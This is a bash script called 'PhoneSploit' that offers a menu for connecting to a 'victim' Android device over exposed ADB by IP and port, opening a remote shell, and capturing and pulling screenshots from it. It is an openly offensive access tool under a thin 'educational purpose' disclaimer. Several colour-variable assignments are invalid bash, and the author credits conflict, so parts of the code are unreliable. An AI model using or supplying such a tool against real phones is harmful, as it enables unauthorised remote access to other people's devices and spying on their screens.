#!/bin/bash
#
# This Tool Designed For Lazy Way To Pentest :)
# Remember Educational Purpose only Not For Crime
# Im Not Responsible If Something Bad Thing Happen
# Use At Your Own Risk
#
# Coded by : Ghost Hunter | White Hacker
# More Info : http://www.ypnwhitehacker.blogspot.com
#
#

# START


#
RED='\033[0;31m'
BLACK='\033[0;30m'
DG='\033[1;31m'
LIGHT RED='\033[1;31m'
GR='\033[0;32m'
LIGHTGREEN='\033[1;32m'
ORANGE='\033[0;33m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
LIGHT BLUE='\033[1;34m'
PURPLE='\033[0;35m'
LIGHT PURPLE='\033[1;35m'
CYAN='\033[0;36m'
LIGHT CYAN='\033[0;36m'
GRAY='\033[0;37m'
LIGHT GRAY='\033[0;37m'
RED='\033[0;31m'
YO='\033[0;33m'
BLU='\033[0;34m'
#
clear
sh logo.sh
echo ""                                     
echo "                        ${YO}Let's Make Your Exploitation And Have Fun"
echo "" 
echo " ${RED}                       ==[ Note:This Tool Is For Beginner "
echo "  ${GR}                      ==[ Note:Don't Use This Tool "
echo "  ${BLU}                      ==[ Note:To Harm Something "
echo "  ${GRAY}                      ==[ Note:Hack Everything,Harm Nothing"
echo "  ${GR}                      ==[ Tools Name : PhoneSploit"
echo "  ${GR}                      ==[ Coded by : Black Wolf"
echo "   ${RED}                     ==[ Version : 1.0.0"
echo "  ${GR}                      ==[ Program Type :BASH"
echo "  ${GR}                      ==[ Gray Wolf Team"
echo ""
echo ""
echo "${GR}Please Select One To Use"
echo ""
echo "${GR}  [01] To Connect A Device"
echo "${BG}  [02] To Show Connected Devices"
echo "${GR}  [03] To Take A Screen Shoot"
echo  "${RED}      [0]  Exit "
echo  $GR""
read -p "" act;

if [ $act = 1 ] || [ $act = 01 ]
then
clear
echo " ${GR}After Connect To Victim Device"
echo "${RED}You Can Do Every Thing Using Terminal Commands"
echo " ${DG}It Is Base On Your Skill"
echo "${RED}PLEASE INPUT IP AND PORT"
echo " EX:ip:port"
read IP
adb connect $IP
adb -s $IP shell
adb shell
ls

fi

if [ $act = 2 ] || [ $act = 02 ]
then
adb devices -l
echo "${RED}Enter Device Ip To Exploit"
read dip
adb -s $dip shell 
fi

if [ $act = 3 ] || [ $act = 03 ]
then
clear
cd /sdcard
echo "${RED}WAIT"
sleep 5
mkdir snaped
echo "${RED}Enter Device Ip To Shoot"
read sip
echo "${GR}Enter File Name To Use"
read fm
adb connect $sip
adb shell screencap /sdcard/$fm.png
adb -s $sip pull /sdcard/$fm.png /sdcard/snaped
sleep 5
echo "${RED}Shotfile Have Been Saved To snaped Folder In Your Phone"
fi

if [ $act = 0 ] || [ $act = 0 ]
then
exit
fi
